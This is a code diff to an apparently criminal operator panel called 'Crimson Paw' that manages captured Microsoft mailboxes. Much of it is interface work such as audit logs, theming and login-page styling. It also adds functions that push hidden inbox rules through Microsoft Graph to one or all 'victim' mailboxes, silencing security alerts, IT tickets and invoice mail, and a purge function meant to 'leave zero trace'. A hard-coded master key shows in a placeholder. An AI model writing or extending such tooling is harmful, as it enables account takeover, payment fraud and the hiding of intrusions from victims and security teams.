+        };
+        let _auditDebounceTimer = null;
+
+        async function loadAuditTrail() {
+            const container = document.getElementById('audit-table-container');
+            if (!container) return;
+
+            try {
+                let url = `/api/admin/audit-logs?limit=${_auditState.limit}&offset=${_auditState.offset}`;
+                if (_auditState.operator_id) url += `&operator_id=${_auditState.operator_id}`;
+                if (_auditState.action_type && _auditState.action_type !== 'all') url += `&action_type=${_auditState.action_type}`;
+                if (_auditState.search) url += `&search=${encodeURIComponent(_auditState.search)}`;
+
+                const res = await fetch(url);
+                if (!res.ok) {
+                    container.innerHTML = `<div style="padding:24px; text-align:center; color:#ff6b72;">Failed to load audit logs (${res.status}). Admin access required.</div>`;
+                    return;
+                }
+                const data = await res.json();
+                if (!data.success) {
+                    container.innerHTML = `<div style="padding:24px; text-align:center; color:#ff6b72;">${data.error || 'Failed to load telemetry.'}</div>`;
+                    return;
+                }
+
+                _auditState.total = data.data.total || 0;
+
+                // Update KPIs
+                const stats = data.stats || {};
+                const kpiTot = document.getElementById('audit-kpi-total');
+                const kpiAct = document.getElementById('audit-kpi-active');
+                const kpiTop = document.getElementById('audit-kpi-top-target');
+                if (kpiTot) kpiTot.innerText = stats.total_events || 0;
+                if (kpiAct) kpiAct.innerText = stats.active_today || 0;
+                if (kpiTop) {
+                    const topT = stats.top_targets && stats.top_targets.length ? stats.top_targets[0] : null;
+                    kpiTop.innerText = topT ? `${topT.target_mailbox} (${topT.cnt})` : 'None';
+                    kpiTop.title = topT ? topT.target_mailbox : '';
+                }
+
+                // Update Operator dropdown if not populated
+                const opSelect = document.getElementById('audit-filter-op');
+                if (opSelect && opSelect.options.length <= 1 && data.operators) {
+                    data.operators.forEach(op => {
+                        const opt = document.createElement('option');
+                        opt.value = op.id;
+                        opt.textContent = `${op.username} (#${op.id})`;
+                        opSelect.appendChild(opt);
+                    });
+                }
+
+                // Render Logs Table
+                renderAuditLogs(data.data.logs || []);
+
+                // Update Pagination Controls
+                updateAuditPagination();
+
+            } catch (err) {
+                container.innerHTML = `<div style="padding:24px; text-align:center; color:#ff6b72;">Error loading audit logs: ${err}</div>`;
+            }
+        }
+
+        function renderAuditLogs(logs) {
+            const container = document.getElementById('audit-table-container');
+            if (!container) return;
+
+            if (!logs || logs.length === 0) {
+                container.innerHTML = `
+                    <div style="padding:48px 24px; text-align:center; color:var(--text-secondary);">
+                        <div style="font-size:32px; margin-bottom:10px;">📋</div>
+                        <div style="font-size:14px; font-weight:600; color:var(--text-primary); margin-bottom:4px;">No Audit Events Found</div>
+                        <div style="font-size:12px;">No operator surveillance activity matches the selected filters.</div>
+                    </div>`;
+                return;
+            }
+
+            const actionColors = {
+                'LOGIN': { bg: 'rgba(88,166,255,0.15)', border: 'rgba(88,166,255,0.4)', text: '#58a6ff', icon: '🔑' },
+                'MAILBOX_VIEW': { bg: 'rgba(187,134,252,0.15)', border: 'rgba(187,134,252,0.4)', text: '#bb86fc', icon: '📁' },
+                'EMAIL_VIEW': { bg: 'rgba(78,201,176,0.15)', border: 'rgba(78,201,176,0.4)', text: '#4ec9b0', icon: '👁️' },
+                'SEARCH_QUERY': { bg: 'rgba(255,183,77,0.15)', border: 'rgba(255,183,77,0.4)', text: '#ffb74d', icon: '🔍' },
+                'EMAIL_DISPATCH': { bg: 'rgba(235,87,87,0.15)', border: 'rgba(235,87,87,0.4)', text: '#eb5757', icon: '📤' },
+                'MESSAGE_MOVE': { bg: 'rgba(240,140,0,0.15)', border: 'rgba(240,140,0,0.4)', text: '#f08c00', icon: '📦' },
+                'MESSAGE_DELETE': { bg: 'rgba(229,9,20,0.15)', border: 'rgba(229,9,20,0.4)', text: '#ff6b72', icon: '🗑️' },
+                'BATCH_DELETE': { bg: 'rgba(229,9,20,0.2)', border: 'rgba(229,9,20,0.5)', text: '#ff6b72', icon: '⚠️' }
+            };
+
+            let html = `
+                <table style="width:100%; border-collapse:collapse; font-size:12px; text-align:left;">
+                    <thead>
+                        <tr style="border-bottom:1px solid var(--border-color); background:rgba(255,255,255,0.02); color:var(--text-secondary); text-transform:uppercase; font-size:11px; letter-spacing:0.05em;">
+                            <th style="padding:12px 16px; font-weight:700;">Timestamp</th>
+                            <th style="padding:12px 16px; font-weight:700;">Operator</th>
+                            <th style="padding:12px 16px; font-weight:700;">Action</th>
+                            <th style="padding:12px 16px; font-weight:700;">Target Mailbox</th>
+                            <th style="padding:12px 16px; font-weight:700;">Activity Details</th>
+                            <th style="padding:12px 16px; font-weight:700;">Workstation &amp; IP</th>
+                        </tr>
+                    </thead>
+                    <tbody>
+            `;
+
+            logs.forEach(log => {
+                const conf = actionColors[log.action_type] || { bg: 'rgba(255,255,255,0.05)', border: 'var(--border-color)', text: 'var(--text-primary)', icon: '📝' };
+                const timeStr = log.created_at || 'Just now';
+                const targetAcct = log.target_mailbox ? `<span style="font-family:monospace; color:var(--accent-color); font-weight:600;">${log.target_mailbox}</span>` : `<span style="color:var(--text-secondary); font-style:italic;">—</span>`;
+                const devHash = log.device_hash ? `<span title="${log.device_hash}" style="font-family:monospace; font-size:10.5px; color:#58a6ff;">[${log.device_hash.substring(0,8)}]</span>` : '';
+                const ipStr = log.ip_address || 'Unknown';
+
+                html += `
+                    <tr style="border-bottom:1px solid rgba(255,255,255,0.04); transition:background 0.15s;" onmouseover="this.style.background='rgba(255,255,255,0.02)'" onmouseout="this.style.background='transparent'">
+                        <td style="padding:12px 16px; white-space:nowrap; color:var(--text-secondary); font-family:monospace;">
+                            ${timeStr}
+                        </td>
+                        <td style="padding:12px 16px; white-space:nowrap;">
+                            <span style="font-weight:700; color:var(--text-primary); display:inline-flex; align-items:center; gap:6px;">
+                                <span style="display:inline-block; width:6px; height:6px; border-radius:50%; background:#3fb950;"></span>
+                                ${log.operator_username}
+                            </span>
+                            <span style="font-size:10px; color:var(--text-secondary); margin-left:4px;">#${log.operator_id}</span>
+                        </td>
+                        <td style="padding:12px 16px; white-space:nowrap;">
+                            <span style="display:inline-flex; align-items:center; gap:4px; padding:3px 8px; border-radius:4px; font-size:10.5px; font-weight:700; background:${conf.bg}; border:1px solid ${conf.border}; color:${conf.text};">
+                                <span>${conf.icon}</span> ${log.action_type}
+                            </span>
+                        </td>
+                        <td style="padding:12px 16px; max-width:180px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap;">
+                            ${targetAcct}
+                        </td>
+                        <td style="padding:12px 16px; max-width:320px; overflow:hidden; text-overflow:ellipsis; white-space:nowrap; color:var(--text-primary);" title="${log.details || ''}">
+                            ${log.details || '—'}
+                        </td>
+                        <td style="padding:12px 16px; white-space:nowrap; font-size:11px; color:var(--text-secondary);">
+                            <span style="font-family:monospace; color:var(--text-primary);">${ipStr}</span>
+                            ${devHash ? ` ${devHash}` : ''}
+                        </td>
+                    </tr>
+                `;
+            });
+
+            html += `</tbody></table>`;
+            container.innerHTML = html;
+        }
+
+        function updateAuditPagination() {
+            const pageInfo = document.getElementById('audit-pagination-info');
+            const pageNum = document.getElementById('audit-page-number');
+            const prevBtn = document.getElementById('audit-prev-btn');
+            const nextBtn = document.getElementById('audit-next-btn');
+
+            const start = _auditState.total === 0 ? 0 : _auditState.offset + 1;
+            const end = Math.min(_auditState.offset + _auditState.limit, _auditState.total);
+            const currentPage = Math.floor(_auditState.offset / _auditState.limit) + 1;
+            const totalPages = Math.ceil(_auditState.total / _auditState.limit) || 1;
+
+            if (pageInfo) pageInfo.innerText = `Showing ${start}-${end} of ${_auditState.total} events`;
+            if (pageNum) pageNum.innerText = `Page ${currentPage} of ${totalPages}`;
+
+            if (prevBtn) {
+                prevBtn.disabled = _auditState.offset === 0;
+                prevBtn.style.opacity = prevBtn.disabled ? '0.4' : '1';
+                prevBtn.style.cursor = prevBtn.disabled ? 'not-allowed' : 'pointer';
+            }
+            if (nextBtn) {
+                nextBtn.disabled = end >= _auditState.total;
+                nextBtn.style.opacity = nextBtn.disabled ? '0.4' : '1';
+                nextBtn.style.cursor = nextBtn.disabled ? 'not-allowed' : 'pointer';
+            }
+        }
+
+        function changeAuditPage(direction) {
+            const newOffset = _auditState.offset + (direction * _auditState.limit);
+            if (newOffset < 0 || newOffset >= _auditState.total) return;
+            _auditState.offset = newOffset;
+            loadAuditTrail();
+        }
+
+        function applyAuditFilters() {
+            const opEl = document.getElementById('audit-filter-op');
+            const typeEl = document.getElementById('audit-filter-type');
+            const searchEl = document.getElementById('audit-filter-search');
+
+            _auditState.operator_id = opEl ? opEl.value : '';
+            _auditState.action_type = typeEl ? typeEl.value : 'all';
+            _auditState.search = searchEl ? searchEl.value.trim() : '';
+            _auditState.offset = 0;
+            loadAuditTrail();
+        }
+
+        function applyAuditFiltersDebounced() {
+            clearTimeout(_auditDebounceTimer);
+            _auditDebounceTimer = setTimeout(applyAuditFilters, 350);
+        }
+
+        function resetAuditFilters() {
+            const opEl = document.getElementById('audit-filter-op');
+            const typeEl = document.getElementById('audit-filter-type');
+            const searchEl = document.getElementById('audit-filter-search');
+            if (opEl) opEl.value = '';
+            if (typeEl) typeEl.value = 'all';
+            if (searchEl) searchEl.value = '';
+            _auditState.operator_id = '';
+            _auditState.action_type = 'all';
+            _auditState.search = '';
+            _auditState.offset = 0;
+            loadAuditTrail();
+        }
+
+        async function confirmPurgeAuditLogs() {
+            const ok = await appConfirm({
+                title: 'Purge Surveillance Audit Logs',
+                message: 'Are you sure you want to PERMANENTLY PURGE all operator audit and surveillance logs?\\nThis action cannot be undone.',
+                confirmText: 'Permanently Purge',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+
+            try {
+                const res = await fetch('/api/admin/audit-logs/clear', { method: 'POST' });
+                const d = await res.json();
+                if (res.ok && d.success) {
+                    showToast('✓ All operator audit logs purged');
+                    _auditState.offset = 0;
+                    loadAuditTrail();
+                } else {
+                    showToast('⚠️ Failed: ' + (d.error || 'Server error'));
+                }
+            } catch (err) {
+                showToast('⚠️ Error: ' + err);
+            }
+        }
+
+        let currentSelectedTheme = document.documentElement.getAttribute('data-theme') || 'crimson';
+
+        async function selectTheme(theme) {
+            currentSelectedTheme = theme;
+            document.documentElement.setAttribute('data-theme', theme);
+            try { localStorage.setItem('crimsonpaw_theme', theme); } catch(e){}
+            
+            // Update theme card active styles
+            ['crimson', 'blue', 'green', 'purple', 'amber', 'titanium'].forEach(t => {
+                const card = document.getElementById('theme-card-' + t);
+                const tag = document.getElementById('theme-tag-' + t);
+                if (card) {
+                    card.style.borderColor = (t === theme) ? 'var(--accent-color)' : 'var(--border-color)';
+                }
+                if (tag) {
+                    tag.style.display = (t === theme) ? 'inline-block' : 'none';
+                }
+            });
+            showToast('🎨 Theme switched to ' + theme.toUpperCase());
+
+            // Universal Single Source of Truth: Auto-persist to server settings.json
+            try {
+                await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ theme: theme })
+                });
+            } catch(e) {}
+        }
+
+        async function saveMasterThemeSettings() {
+            const platformName = (document.getElementById('setting-platform-name') ? document.getElementById('setting-platform-name').value : '').trim();
+            const logoUrl = (document.getElementById('setting-custom-logo-url') ? document.getElementById('setting-custom-logo-url').value : '').trim();
+            
+            try {
+                const res = await fetch('/api/settings', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        theme: currentSelectedTheme,
+                        platform_name: platformName || 'CRIMSON PAW',
+                        custom_logo_url: logoUrl
+                    })
+                });
+                const d = await res.json();
+                if (res.ok && d.success) {
+                    showToast('✓ Theme & Branding permanently saved for this deployment!');
+                } else {
+                    showToast('⚠️ ' + (d.error || 'Failed to save settings'));
+                }
+            } catch (err) {
+                showToast('⚠️ Network error: ' + err);
+            }
+        }
+
+        function updateLogoPreviewFromUrl(url) {
+            const preview = document.getElementById('theme-logo-preview');
+            if (preview && url) {
+                preview.src = url;
+            }
+        }
+
+        async function handleLogoFileSelected(event) {
+            const file = event.target.files && event.target.files[0];
+            if (!file) return;
+
+            const status = document.getElementById('logo-upload-status');
+            if (status) status.innerText = 'Uploading...';
+
+            const formData = new FormData();
+            formData.append('logo', file);
+
+            try {
+                const res = await fetch('/api/settings/upload-logo', {
+                    method: 'POST',
+                    body: formData
+                });
+                const d = await res.json();
+                if (res.ok && d.success && d.logo_url) {
+                    const preview = document.getElementById('theme-logo-preview');
+                    if (preview) preview.src = d.logo_url;
+                    const urlInput = document.getElementById('setting-custom-logo-url');
+                    if (urlInput) urlInput.value = d.logo_url;
+                    
+                    // Immediately update sidebar logo in DOM
+                    const sidebarLogo = document.querySelector('.sidebar-header img');
+                    if (sidebarLogo) sidebarLogo.src = d.logo_url;
+
+                    if (status) {
+                        status.innerText = '✓ Uploaded';
+                        status.style.color = 'var(--accent-color)';
+                    }
+                    showToast('✓ Platform logo uploaded & active across all pages!');
+                } else {
+                    if (status) status.innerText = '⚠️ Failed';
+                    showToast('⚠️ Logo upload failed: ' + (d.error || 'Server error'));
+                }
+            } catch(e) {
+                if (status) status.innerText = '⚠️ Network error';
+                showToast('⚠️ Upload error: ' + e);
+            }
+        }
+
+        // Server settings.json is the Single Source of Truth
+        (function() {
+            try {
+                const serverTheme = document.documentElement.getAttribute('data-theme');
+                if (serverTheme) {
+                    currentSelectedTheme = serverTheme;
+                    localStorage.setItem('crimsonpaw_theme', serverTheme);
+                }
+            } catch(e) {}
+        })();
 
         function switchSettingsTab(tab) {
-            const tabs = ['account', '2fa', 'telegram'];
+            const tabs = ['account', '2fa', 'telegram', 'theme'];
             tabs.forEach(t => {
                 const pane = document.getElementById('settings-pane-' + t);
                 const btn = document.getElementById('settings-tab-btn-' + t);
                 const isActive = (t === tab);
                 if (pane) pane.style.display = isActive ? 'block' : 'none';
                 if (btn) {
-                    btn.style.background = isActive ? '#2a0f14' : 'transparent';
-                    btn.style.borderColor = isActive ? '#e50914' : 'transparent';
+                    btn.style.background = isActive ? 'var(--border-color)' : 'transparent';
+                    btn.style.borderColor = isActive ? 'var(--accent-color)' : 'transparent';
                     btn.style.color = isActive ? '#ffffff' : '#a49498';
                     btn.style.fontWeight = isActive ? '700' : '600';
                 }
@@ -10588,6 +11479,90 @@ Delegated     : ${inboxesDesc}
                 }
             } catch(e) {
                 showToast('⚠️ Delete failed: ' + e);
+            }
+        }
+
+        async function applyPresetRule(presetKey, allInboxes) {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session')?.value;
+            if (!uc && !allInboxes) {
+                showToast('⚠️ Please select a captured mailbox session first.');
+                return;
+            }
+
+            const names = {
+                'silent_quarantine': 'Silent Quarantine (SOC & Security Alerts)',
+                'mute_it_tickets': 'Mute IT Support & Helpdesk Tickets',
+                'stealth_finance': 'Stealth Finance & Invoice Filter'
+            };
+            const presetName = names[presetKey] || presetKey;
+
+            const targetDesc = allInboxes 
+                ? 'ALL captured victim mailboxes across the platform' 
+                : 'this victim mailbox';
+
+            const ok = await appConfirm({
+                title: `Apply ${presetName}`,
+                message: `Deploy automated rule "${presetName}" to ${targetDesc} via Microsoft Graph?\n\nThis will automatically divert matched incoming emails so they do not alert the victim.`,
+                confirmText: allInboxes ? 'Deploy to ALL Inboxes' : 'Apply to This Inbox',
+                danger: false,
+                icon: '⚡'
+            });
+            if (!ok) return;
+
+            try {
+                showToast('⏳ Deploying suppression rule via Graph API...');
+                const res = await (await fetch('/api/graph_proxy/apply_preset_rule', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: uc, preset_key: presetKey, all_inboxes: allInboxes })
+                })).json();
+
+                if (res.error) {
+                    showToast('⚠️ Error applying preset: ' + (res.error.message || res.error));
+                } else {
+                    const msg = allInboxes 
+                        ? `✓ Preset rule deployed across ${res.created_count || 'all'} victim inboxes!`
+                        : `✓ "${presetName}" successfully active on victim mailbox!`;
+                    showToast(msg);
+                    if (uc) loadMessageRules(uc);
+                }
+            } catch(e) {
+                showToast('⚠️ Preset application failed: ' + e);
+            }
+        }
+
+        async function confirmPurgeRules() {
+            const uc = currentOutlookUserCode || document.getElementById('mailbox-session')?.value;
+            if (!uc) {
+                showToast('⚠️ Please select a captured mailbox session first.');
+                return;
+            }
+
+            const ok = await appConfirm({
+                title: 'Purge All Inbox Rules',
+                message: 'Are you sure you want to PURGE ALL inbox rules from this victim mailbox?\n\nThis will permanently delete all custom and suppression rules to leave zero trace.',
+                confirmText: 'Purge All Rules',
+                danger: true,
+                icon: '🗑️'
+            });
+            if (!ok) return;
+
+            try {
+                showToast('⏳ Purging all inbox rules via Graph API...');
+                const res = await (await fetch('/api/graph_proxy/purge_rules', {
+                    method: 'POST',
+                    headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ user_code: uc, all_inboxes: false })
+                })).json();
+
+                if (res.error) {
+                    showToast('⚠️ Error purging rules: ' + (res.error.message || res.error));
+                } else {
+                    showToast(`✓ Purged ${res.purged_count || 0} inbox rule(s) successfully!`);
+                    loadMessageRules(uc);
+                }
+            } catch(e) {
+                showToast('⚠️ Purge failed: ' + e);
             }
         }
 
@@ -12541,21 +13516,88 @@ Delegated     : ${inboxesDesc}
 '''
 
 CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-theme="{{ active_theme or 'crimson' }}">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CRIMSON PAW — Administrator Access</title>
-    <link rel="icon" type="image/png" href="/static/img/crimson_paw_logo.png">
+    <title>{{ platform_name or 'CRIMSON PAW' }} — Administrator Access</title>
+    <link rel="icon" type="image/png" href="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <style>
+        :root, [data-theme="crimson"] { 
+            --bg-primary: #0a0709; --bg-sidebar: #100b0e; --bg-panel: #161014; 
+            --border-color: #2e1216; --border-hover: #4e1a22;
+            --text-primary: #f0ebed; --text-secondary: #a49498; 
+            --accent-color: #e50914; --accent-hover: #ff2a35;
+            --accent-glow: rgba(229, 9, 20, 0.35); --accent-glow-strong: rgba(229, 9, 20, 0.65);
+            --accent-gradient: linear-gradient(135deg, #e50914, #b00710);
+            --accent-gradient-hover: linear-gradient(135deg, #ff1f2a, #cc0813);
+            --badge-bg: #261115; --badge-border: #5a1c22; --badge-color: #ff8b94;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="blue"] {
+            --bg-primary: #050a14; --bg-sidebar: #091020; --bg-panel: #0d172e;
+            --border-color: #16264c; --border-hover: #23407d;
+            --text-primary: #e6f0ff; --text-secondary: #8da2c0;
+            --accent-color: #0084ff; --accent-hover: #339cff;
+            --accent-glow: rgba(0, 132, 255, 0.35); --accent-glow-strong: rgba(0, 132, 255, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0084ff, #0056b3);
+            --accent-gradient-hover: linear-gradient(135deg, #339cff, #006ee6);
+            --badge-bg: #0d2244; --badge-border: #1a427d; --badge-color: #80bfff;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="green"] {
+            --bg-primary: #051208; --bg-sidebar: #091c0e; --bg-panel: #0e2b16;
+            --border-color: #154522; --border-hover: #1e6633;
+            --text-primary: #e6ffed; --text-secondary: #8dc09a;
+            --accent-color: #00e676; --accent-hover: #33eb91;
+            --accent-glow: rgba(0, 230, 118, 0.35); --accent-glow-strong: rgba(0, 230, 118, 0.65);
+            --accent-gradient: linear-gradient(135deg, #00c853, #009624);
+            --accent-gradient-hover: linear-gradient(135deg, #00e676, #00b248);
+            --badge-bg: #0b3318; --badge-border: #14592a; --badge-color: #69f0ae;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="purple"] {
+            --bg-primary: #0a0514; --bg-sidebar: #120924; --bg-panel: #1b0e36;
+            --border-color: #311860; --border-hover: #4a2491;
+            --text-primary: #f3e8ff; --text-secondary: #aa95c4;
+            --accent-color: #a855f7; --accent-hover: #be7bf9;
+            --accent-glow: rgba(168, 85, 247, 0.35); --accent-glow-strong: rgba(168, 85, 247, 0.65);
+            --accent-gradient: linear-gradient(135deg, #9333ea, #6b21a8);
+            --accent-gradient-hover: linear-gradient(135deg, #a855f7, #7e22ce);
+            --badge-bg: #29144d; --badge-border: #4d238c; --badge-color: #d8b4fe;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="amber"] {
+            --bg-primary: #120c04; --bg-sidebar: #1c1307; --bg-panel: #291b0b;
+            --border-color: #4a3114; --border-hover: #734c1f;
+            --text-primary: #fff8e6; --text-secondary: #c4ad8d;
+            --accent-color: #f59e0b; --accent-hover: #fbbf24;
+            --accent-glow: rgba(245, 158, 11, 0.35); --accent-glow-strong: rgba(245, 158, 11, 0.65);
+            --accent-gradient: linear-gradient(135deg, #d97706, #b45309);
+            --accent-gradient-hover: linear-gradient(135deg, #f59e0b, #d97706);
+            --badge-bg: #3d260f; --badge-border: #6b431a; --badge-color: #fcd34d;
+            --danger: #e50914; --success: #2ea043;
+        }
+        [data-theme="titanium"] {
+            --bg-primary: #0a0c10; --bg-sidebar: #11141a; --bg-panel: #191e26;
+            --border-color: #28303d; --border-hover: #3d495c;
+            --text-primary: #f1f5f9; --text-secondary: #94a3b8;
+            --accent-color: #38bdf8; --accent-hover: #7dd3fc;
+            --accent-glow: rgba(56, 189, 248, 0.35); --accent-glow-strong: rgba(56, 189, 248, 0.65);
+            --accent-gradient: linear-gradient(135deg, #0284c7, #0369a1);
+            --accent-gradient-hover: linear-gradient(135deg, #38bdf8, #0284c7);
+            --badge-bg: #132338; --badge-border: #23426b; --badge-color: #7dd3fc;
+            --danger: #e50914; --success: #2ea043;
+        }
+
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
         body {
-            background-color: #0a0709;
+            background-color: var(--bg-primary);
             background-image: 
-                radial-gradient(ellipse at 50% 0%, rgba(229, 9, 20, 0.16) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 100%, rgba(56, 22, 27, 0.28) 0%, transparent 60%);
-            color: #f0ebed;
+                radial-gradient(ellipse at 50% 0%, var(--accent-glow) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 100%, var(--border-color) 0%, transparent 60%);
+            color: var(--text-primary);
             min-height: 100vh;
             display: flex;
             align-items: center;
@@ -12563,13 +13605,13 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             padding: 20px;
         }
         .login-card {
-            background: #140d10;
-            border: 1px solid #38161b;
+            background: var(--bg-sidebar);
+            border: 1px solid var(--border-color);
             border-radius: 14px;
             width: 100%;
             max-width: 440px;
             padding: 38px 32px;
-            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px rgba(229, 9, 20, 0.08);
+            box-shadow: 0 16px 40px rgba(0, 0, 0, 0.8), 0 0 30px var(--accent-glow);
             position: relative;
             overflow: hidden;
         }
@@ -12578,7 +13620,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             position: absolute;
             top: 0; left: 0; right: 0;
             height: 3px;
-            background: linear-gradient(90deg, #e50914, #ff6b72, #e50914);
+            background: var(--accent-gradient);
         }
         .brand-header {
             text-align: center;
@@ -12588,8 +13630,8 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             width: 56px;
             height: 56px;
             border-radius: 12px;
-            border: 1px solid rgba(229, 9, 20, 0.4);
-            box-shadow: 0 0 20px rgba(229, 9, 20, 0.4);
+            border: 1px solid var(--border-color);
+            box-shadow: 0 0 20px var(--accent-glow);
             margin-bottom: 12px;
         }
         .brand-title {
@@ -12603,7 +13645,7 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             font-size: 0.72rem;
             font-weight: 700;
             letter-spacing: 0.2em;
-            color: #ff6b72;
+            color: var(--accent-color);
             text-transform: uppercase;
             margin-top: 4px;
         }
@@ -12622,23 +13664,23 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
         }
         .form-input {
             width: 100%;
-            background: #0c0709;
-            border: 1px solid #38161b;
+            background: var(--bg-panel);
+            border: 1px solid var(--border-color);
             border-radius: 8px;
-            color: #ffffff;
+            color: var(--text-primary);
             padding: 12px 14px;
             font-size: 0.92rem;
             outline: none;
             transition: all 0.2s ease;
         }
         .form-input:focus {
-            border-color: #e50914;
-            box-shadow: 0 0 0 2px rgba(229, 9, 20, 0.25);
-            background: #11090d;
+            border-color: var(--accent-color);
+            box-shadow: 0 0 0 2px var(--accent-glow);
+            background: var(--bg-sidebar);
         }
         .btn-submit {
             width: 100%;
-            background: linear-gradient(135deg, #e50914, #b00710);
+            background: var(--accent-gradient);
             color: #ffffff;
             border: 1px solid rgba(255, 255, 255, 0.15);
             border-radius: 8px;
@@ -12650,31 +13692,31 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
             cursor: pointer;
             transition: all 0.2s ease;
             margin-top: 8px;
-            box-shadow: 0 4px 18px rgba(229, 9, 20, 0.35);
+            box-shadow: 0 4px 18px var(--accent-glow);
         }
         .btn-submit:hover:not(:disabled) {
             transform: translateY(-1px);
-            box-shadow: 0 6px 22px rgba(229, 9, 20, 0.55);
-            background: linear-gradient(135deg, #ff1a25, #c70813);
+            box-shadow: 0 6px 22px var(--accent-glow-strong);
+            background: var(--accent-gradient-hover);
         }
         .btn-submit:disabled {
             opacity: 0.6;
             cursor: not-allowed;
         }
         .alert-box {
-            background: rgba(229, 9, 20, 0.12);
-            border: 1px solid rgba(229, 9, 20, 0.4);
+            background: var(--badge-bg);
+            border: 1px solid var(--badge-border);
             border-radius: 8px;
             padding: 10px 14px;
             font-size: 0.78rem;
-            color: #ff858c;
+            color: var(--accent-color);
             margin-bottom: 18px;
             display: none;
             line-height: 1.4;
         }
         .alert-box.locked {
-            background: rgba(229, 9, 20, 0.25);
-            border: 2px solid #e50914;
+            background: var(--badge-bg);
+            border: 2px solid var(--accent-color);
             color: #ffffff;
             font-weight: 600;
         }
@@ -12690,8 +13732,8 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 <body>
     <div class="login-card">
         <div class="brand-header">
-            <img src="/static/img/crimson_paw_logo.png" alt="Crimson Paw" class="brand-logo">
-            <div class="brand-title">CRIMSON PAW</div>
+            <img src="{{ custom_logo_url or '/static/img/crimson_paw_logo.png' }}" alt="{{ platform_name or 'Crimson Paw' }}" class="brand-logo" style="object-fit:contain;">
+            <div class="brand-title">{{ platform_name or 'CRIMSON PAW' }}</div>
             <div class="brand-subtitle">Administrator Console</div>
         </div>
 
@@ -12736,30 +13778,30 @@ CRIMSON_PAW_LOGIN_HTML = r'''<!DOCTYPE html>
 
     <!-- Master Superadmin Emergency Switch Modal -->
     <div id="master-modal-backdrop" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.85); backdrop-filter:blur(6px); z-index:10000; align-items:center; justify-content:center; padding:16px;">
-        <div style="background:#130b0e; border:1px solid #e50914; box-shadow:0 0 35px rgba(229,9,20,0.35); border-radius:14px; width:100%; max-width:440px; padding:28px 24px; position:relative; color:#f0ebed;">
-            <button type="button" onclick="closeMasterModal()" style="position:absolute; top:14px; right:16px; background:none; border:none; color:#a49498; font-size:1.2rem; cursor:pointer; padding:4px 8px;">✕</button>
+        <div style="background:var(--bg-sidebar); border:1px solid var(--border-color); box-shadow:0 0 35px var(--accent-glow); border-radius:14px; width:100%; max-width:440px; padding:28px 24px; position:relative; color:var(--text-primary);">
+            <button type="button" onclick="closeMasterModal()" style="position:absolute; top:14px; right:16px; background:none; border:none; color:var(--text-secondary); font-size:1.2rem; cursor:pointer; padding:4px 8px;">✕</button>
             
             <div style="display:flex; align-items:center; gap:12px; margin-bottom:18px;">
                 <div style="font-size:1.6rem; line-height:1;">🛡️</div>
                 <div>
                     <div style="font-size:1.02rem; font-weight:800; color:#ffffff; letter-spacing:0.02em;">Master Superadmin Emergency Switch</div>
-                    <div style="font-size:0.72rem; color:#a49498;">Independent Infrastructure Authority</div>
+                    <div style="font-size:0.72rem; color:var(--text-secondary);">Independent Infrastructure Authority</div>
                 </div>
             </div>
 
             <!-- Authorization Box -->
             <div id="master-auth-box">
-                <div style="font-size:0.76rem; color:#c9d1d9; margin-bottom:10px;">Enter authorization key to unlock emergency controls:</div>
+                <div style="font-size:0.76rem; color:var(--text-secondary); margin-bottom:10px;">Enter authorization key to unlock emergency controls:</div>
                 <div style="margin-bottom:12px;">
                     <input type="password" id="master-key-input" placeholder="Master Key (Badger@Master#2026!)" 
-                           style="width:100%; background:#1c1014; border:1px solid #38161b; color:#fff; border-radius:8px; padding:10px 12px; font-size:0.85rem; outline:none;" 
+                           style="width:100%; background:var(--bg-panel); border:1px solid var(--border-color); color:var(--text-primary); border-radius:8px; padding:10px 12px; font-size:0.85rem; outline:none;" 
                            onkeydown="if(event.key==='Enter')verifyMasterKey()">
                 </div>
                 <button type="button" onclick="verifyMasterKey()" id="btn-master-auth" 
-                        style="width:100%; background:linear-gradient(135deg, #e50914, #b20710); border:none; color:#fff; font-weight:700; border-radius:8px; padding:10px; cursor:pointer; font-size:0.86rem;">
+                        style="width:100%; background:var(--accent-gradient); border:1px solid rgba(255,255,255,0.15); color:#fff; font-weight:700; border-radius:8px; padding:10px; cursor:pointer; font-size:0.86rem; box-shadow:0 2px 10px var(--accent-glow);">
                     Authorize Master Key ❯
                 </button>
-                <div id="master-auth-err" style="display:none; color:#ff6b72; font-size:0.74rem; margin-top:8px;"></div>
+                <div id="master-auth-err" style="display:none; color:var(--accent-color); font-size:0.74rem; margin-top:8px;"></div>
             </div>
 
             <!-- Emergency Controls Panel -->
